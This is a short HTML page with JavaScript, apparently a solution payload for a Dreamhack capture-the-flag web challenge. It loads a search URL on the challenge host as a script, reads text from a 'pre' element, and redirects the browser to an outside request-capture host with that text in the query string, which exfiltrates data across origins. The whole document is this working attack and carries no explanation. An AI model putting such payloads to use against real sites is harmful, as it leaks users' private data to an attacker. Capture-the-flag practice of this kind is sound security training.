<html>
<script>
function req(url) {
    let script = document.createElement('script');
    script.src = url;
    script.onload = () => {
        setTimeout(() => {
            if (document.body.innerHTML.includes("not found")) {
                parent.location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
            } else {
				let resultText = window.document.querySelector("pre").innerText;
				console.log(resultText);
                location.href = `https://tndjosf.request.dreamhack.games/?result=${resultText}`;
            }
        }, 500);
    };
    script.onerror = () => console.log(`Failed: ${url}`);
    document.head.appendChild(script);
}

req("http://host1.dreamhack.games:11005/search?query=DreamHack");
</script>
</html>
